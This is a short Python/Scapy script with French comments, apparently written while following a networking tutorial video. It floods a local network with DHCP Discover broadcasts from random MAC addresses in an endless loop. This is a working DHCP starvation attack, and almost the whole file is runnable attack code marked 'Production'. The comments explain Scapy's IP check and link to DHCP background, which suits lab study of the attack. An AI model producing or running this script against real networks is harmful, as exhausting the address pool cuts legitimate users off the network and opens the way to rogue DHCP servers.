from scapy.all import *
__author__ = "Chauvin Antoine"
__copyright__ = "David Bombal"
__credits__ = ["David Bombal", "https://www.youtube.com/watch?v=VW0szfPHeo0"]
__license__ = ""
__version__ = "1.0"
__maintainer__ = "Chauvin Antoine"
__email__ = "antoine.chauvin@live.fr"
__status__ = "Production"


# Scapy s'assure normalement que les réponses proviennent de la même adresse IP à laquelle le stimulus a été envoyé.
# Mais notre paquet DHCP est envoyé à l'adresse de diffusion IP (255.255.255.255) et tout paquet de
# réponse (stimulus) aura l'adresse IP du serveur DHCP répondant comme adresse IP source (par exemple 192.168.1.1). 
# Étant donné que ces adresses IP ne correspondent pas, nous devons désactiver la vérification de Scapy avant d'envoyer le stimulus.conf.checkIPaddr = False
# https://scapy.readthedocs.io/en/latest/usage.html
conf.checkIPaddr = False

# http://www.iro.umontreal.ca/~kropf/ift-6052/notes/dhcp/index.html
# Pourquoi mettre une addresse source sur du protocole UDP ? 
# https://www.quora.com/Does-UDP-need-a-source-port
# https://stackoverflow.com/questions/33593966/why-do-i-need-source-port-on-udp
# Qu'est-ce que BOOTP ?
# https://www.ionos.fr/digitalguide/serveur/know-how/bootp/
dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \
                     /IP(src='0.0.0.0',dst='255.255.255.255') \
                     /UDP(sport=68,dport=67) \
                     /BOOTP(op=1,chaddr = RandMAC()) \
                     /DHCP(options=[('message-type','discover'),('end')])

# On envoie le paquet sur l'interface eth0 en effectuant un rebouclage
sendp(dhcp_discover,iface='eth0',loop=1,verbose=1)
